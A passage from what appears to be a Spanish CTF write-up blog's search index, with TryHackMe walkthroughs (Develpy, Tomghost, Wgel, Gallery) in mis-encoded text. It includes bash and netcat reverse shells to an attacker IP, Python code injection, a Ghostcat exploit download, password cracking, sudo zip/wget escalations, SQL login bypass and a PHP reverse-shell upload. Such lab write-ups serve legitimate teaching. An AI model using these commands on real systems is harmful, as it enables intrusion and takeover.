â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: downloads/src/buildscript.sh â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ #!/bin/bash 2 â”‚ 3 â”‚ bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Nos abrimos un servidor con python\nsudo python3 -m http.server 80 Y por Ãºltimo nos ponemos en escucha por el puerto 443 con netcat\nnc -nlvp 443 Nos esperamos un rato y ya somos root\n","date":"2023-01-07","id":105,"permalink":"/writeups/tryhackme/overpass/","summary":"https://tryhackme.com/room/overpass\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.170.40\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","crontab"],"title":"Overpass"},{"content":"Link de la mÃ¡quina\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.139.165\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.139.165 PING 10.10.139.165 (10.10.139.165) 56(84) bytes of data. 64 bytes from 10.10.139.165: icmp_seq=1 ttl=63 time=50.4 ms --- 10.10.139.165 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 50.434/50.434/50.434/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.139.165 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.139.165 5 â”‚ [*] Open ports: 22,10000 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p22,10000 -sC -sV 10.10.139.165 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 78c44084f442138e79f86be46dbfd446 (RSA) | 256 259df329a2624b24f28336cfa775bb66 (ECDSA) |_ 256 e7a007b0b9cb74e9d6167d7a67fec11d (ED25519) 10000/tcp open snet-sensor-mgmt? | fingerprint-strings: | GenericLines: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 0 | SyntaxError: unexpected EOF while parsing | GetRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;GET\u0026#39; is not defined | HTTPOptions, RTSPRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;OPTIONS\u0026#39; is not defined | NULL: | Private 0days |_ Please enther number of exploits to send??: Puerto 10000 Cuando nos conectamos por nc al puerto 10000 sale este mensaje:\nâ¯ nc 10.10.139.165 10000 Private 0days Please enther number of exploits to send??: Si ponemos una letra en vez de un nÃºmero da error. En este error podemos ver que el programa estÃ¡ hecho en python y que se llama exploit.py. Es posible que sea posible inyectar cÃ³digo en un programa que espera una entrada del usuario y luego la interpreta como una variable.\nSi probamos ejecutando esto: __import__('os').system('whoami') nos devuelve el usuario king\nâ¯ nc 10.10.139.165 10000 Private 0days Please enther number of exploits to send??: __import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;) king Exploit started, attacking target (tryhackme.com)... IntrusiÃ³n Como ya hemos visto que podemos inyectar cÃ³digo vamos a intentar mandarnos una reverse shell.\nPrimero nos ponemos en escucha por el puerto 443 con netcat de la siguiente forma: nc -nvlp 443 DespuÃ©s en el exploit.py le vamos a poner __import__('os').system('nc -e /bin/sh 10.10.10.10 443')\nEscalada de privilegios Tratamiento de la tty Antes de empezar lo primero para trabajar mejor es hacer un tratamiento de la tty\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm user.txt La falg user.txt estÃ¡ en /home/king/user.txt y la podemos ver con un cat /home/king/user.txt\nroot.txt Con un cat /etc/crontab podemos ver que el archivo root.sh lo estÃ¡ ejecutando continuamente el usuario root. No tenemos permisos de escritura en el root.sh, pero lo que podemos hacer es borrarlo, crear un archivo que se llame igual y dentro ponerle el siguiente cÃ³digo\n#!/bin/bash nc -e /bin/sh 10.10.10.10 442 Y nos ponemos en escucha con netcat por el puerto 442\nAl cabo de unos segundos recibimos la conexiÃ³n y somos root. Podemos ver la flag con un cat /root/root.txt\n","date":"2022-12-31","id":106,"permalink":"/writeups/tryhackme/develpy/","summary":"Link de la mÃ¡quina\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.139.165\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","python","crontab"],"title":"Develpy"},{"content":"","date":"2022-12-30","id":107,"permalink":"/tags/cve-2020-1938/","summary":"","tags":[],"title":"CVE-2020-1938"},{"content":"Link de la mÃ¡quina\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.126.65\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.126.65 PING 10.10.126.65 (10.10.126.65) 56(84) bytes of data. 64 bytes from 10.10.126.65: icmp_seq=1 ttl=63 time=53.0 ms --- 10.10.126.65 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.964/52.964/52.964/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.126.65 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.126.65 5 â”‚ [*] Open ports: 22,53,8009,8080 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p22,53,8009,8080 -sC -sV 10.10.126.65 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA) | 256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA) |_ 256 48d1301b386cc653ea3081805d0cf105 (ED25519) 53/tcp open tcpwrapped 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9.0.30 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/9.0.30 Puerto 8009 Con searchsploit podemos buscar si existe algÃºn exploit para ajp\nâ¯ searchsploit ajp -------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------- --------------------------------- Apache Tomcat - AJP \u0026#39;Ghostcat File Read/Inclusion | multiple/webapps/48143.py Apache Tomcat - AJP \u0026#39;Ghostcat\u0026#39; File Read/Inclusion (Met | multiple/webapps/49039.rb -------------------------------------------------------- --------------------------------- Al probar con el 48143.py no funciona bien. E encontrado otro exploit de 00theway https://github.com/00theway/Ghostcat-CNVD-2020-10487\nwget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py python3 ajpShooter.py http://10.10.126.65 8009 /WEB-INF/web.xml read En una lÃ­nea especÃ­fica un usuario y una contraseÃ±a\n\u0026lt;description\u0026gt; Welcome to GhostCat skyfuck:--pass-- \u0026lt;/description\u0026gt; Escalada de privilegios Merlin Con ssh ya nos podemos conectar como skyfuck. Al entrar lo primero que vemos son dos archivos: credential.pgp y tryhackme.asc, con un cat tryhackme.asc podemos ver que contiene una pgp private key con la cual podemos ver el contenido de credential.pgp.\ngpg --import tryhackme.asc gpg --decrypt credential.pgp Nos pide una passphrase\nCon python nos vamos a montar un servidor en la mÃ¡quina vÃ­ctima para pasarnos el archivo tryhackme.asc a nuestra mÃ¡quina con python3 -m http.server y desde nuestra mÃ¡quina con wget nos lo pasamos wget http://10.10.126.65:8000/tryhackme.asc\nDesde nuestra mÃ¡quina vamos a sacar el hash con\ngpg2john tryhackme.asc \u0026gt; hash Ahora ya podemos mediante el diccionario rockyou.txt hacer fuerza bruta y encontrar la passphrase\njohn --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash Nos encuentra las passphrase, ahora ya podemos aceder al credentials.pgp y ver las credenciales de el usuario merlin.\nDentro de la carpeta personal de merlin podemos ver la flag user.txt.\nRoot Con un sudo -l podemos ver que puede ejecutar zip como root sin proporcionar contraseÃ±a, nos podemos aprovechar de esto de la siguiente forma.\nTF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT \u0026#39;sh #\u0026#39; sudo rm $TF Ahora ya somos root y podemos ver la flag en /root/root.txt\n","date":"2022-12-30","id":108,"permalink":"/writeups/tryhackme/tomghost/","summary":"Link de la mÃ¡quina\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.126.65\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","CVE-2020-1938","zip"],"title":"Tomghost"},{"content":"","date":"2022-12-30","id":109,"permalink":"/tags/zip/","summary":"","tags":[],"title":"zip"},{"content":"https://tryhackme.com/room/wgelctf\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.176.77\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.176.77 PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data. 64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms --- 10.10.176.77 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 108.118/108.118/108.118/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.176.77 -oG allPort ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.176.77 5 â”‚ [*] Open ports: 22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p22,80 -sC -sV 10.10.176.77 -oN target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94961b66801b7648682d14b59a01aaaa (RSA) | 256 18f710cc5f40f6cf92f86916e248f438 (ECDSA) |_ 256 b90b972e459bf32a4b11c7831033e0ce (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Web En el puerto 80 estÃ¡ corriendo una web, con el whatweb podemos ver un poco de informaciÃ³n sobre la web.\nâ¯ whatweb 10.10.176.77 http://10.10.176.77 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.176.77], Title[Apache2 Ubuntu Default Page: It works] Con ctrl + u podemos ver el cÃ³digo de la web en el cual se ve una lÃ­nea comentada con un mensaje: \u0026lt;!-- Jessie don't forget to udate the webiste --\u0026gt; Con esto podemos intuir que hay un usuario llamado Jessie\nwfuzz y gobuster (subdirectorios) Con wfuzz vamos a buscar subdirectorios mediante un diccionario ubicado en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando\nâ¯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.176.77/FUZZ Nos reporta el subdirectorio /sitemap en el cual hay una web con muchos apartados. Con wfuzz otra vez, vamos a buscar subdirectorios sobre el directorio sitemap, mediante el mismo comando, pero cambiando la ubicaciÃ³n: de 10.10.176.77/FUZZ a 10.10.176.77/sitemap/FUZZ. No ha encontrado nada, probamos con gobuster y otro diccionario el cual estÃ¡ ubicado en /usr/share/wordlists/dirb/common.txt.\ngobuster dir -u http://10.10.176.77/sitemap/ -w /usr/share/wordlists/dirb/common.txt InfiltraciÃ³n Ahora nos reporta varios subdirectorios, entre ellos un .ssh, el cual contiene una rsa private key\nPara conectarnos por ssh la vamos a guardar en un archivo llamado id_rsa, y nos vamos a conectar con el usuario Jessie que encontramos anteriormente y la llave que encontramos\nchmod 600 id_rsa ssh -i id_rsa jessie@10.10.176.77 User Flag Podemos ver la flag en /home/jessie/Documents/user_flag.txt.\nRoot Flag Con un sudo -l podemos ver que podemos ejecutar wget como root sin proporcionar contraseÃ±a. En https://gtfobins.github.io/gtfobins/wget/#shell Podemos ver que hay una forma de leer archivos aprovechÃ¡ndonos del wget . Intuyendo que la flag estÃ¡ en /root/root_flag.txt, con los siguientes comandos deberÃ­amos de poder leerlo\nLFILE=/root/root_flag.txt wget -i $LFILE Ya tenemos la flag!!!\n","date":"2022-12-28","id":110,"permalink":"/writeups/tryhackme/wgel/","summary":"https://tryhackme.com/room/wgelctf\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.176.77\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","wget"],"title":"Wgel"},{"content":"","date":"2022-12-28","id":111,"permalink":"/tags/wget/","summary":"","tags":[],"title":"wget"},{"content":"https://tryhackme.com/room/gallery666\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.250.47\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.250.47 PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data. 64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms --- 10.10.250.47 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.300/52.300/52.300/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nâ¯ sudo nmap -p- --open -sS --min-rate 5000 -Pn -vvv -n 10.10.110.190 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.110.190 5 â”‚ [*] Open ports: 80,8080 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p80,8080 -sC -sV 10.10.110.190 -oN target PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 8080/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: Simple Image Gallery System | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION ParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Web Con el whatweb podemos ver mÃ¡s informaciÃ³n de la web\nâ¯ whatweb 10.10.110.190 http://10.10.110.190 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.110.190], Title[Apache2 Ubuntu Default Page: It works] Buscando subdirectorios Con wfuzz vamos a fuzzear mediante el dicionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt para encontrar subdirectorios\nwfuzz -c -t 200 --hc=404 --hh=42126 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.151.26/FUZZ Nos reporta el directorio /gallery\n/gallery Al entrar nos lleva a /gallery/login.php y vemos un panel para iniciar sessiÃ³n, primero comprobamos si admin:admin funciona, pero no. Podemos probar con usuario ' or 1 = 1-- - y cualquier contraseÃ±a y ya nos entra\nAdmin Ahora estamos dentro de la cuenta de administrador y podemos ver los Ã¡lbums, Al entrar dentro de uno vemos que nos deja subir fotos nuevas.\nAl probar de subir un .php no lo acepta, con burpsuite he probado con un diccionario de extensiones y solo acepta extensiones de fotos\nDentro de la configuraciÃ³n del perfil del admin, hay un apartado para cambiar la foto. El mensaje, dice, selecciona un archivo. Podemos intentar mandarle un archivo .php para mandarnos una reverse shell\nIntrusiÃ³n Vamos a intentar subir un archivo php de pentestmonkey para la reverse shell: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php.\nEs importante cambiar las lÃ­neas de ip y port y poner la ip de nuestra mÃ¡quina y el puerto por el que nos vamos a poner en escucha con netcat (443)\nAhora ya podemos subir el archivo y al darle a update, recibimos a reverse shell\nEscalada de privilegios Tratamiento de la tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm 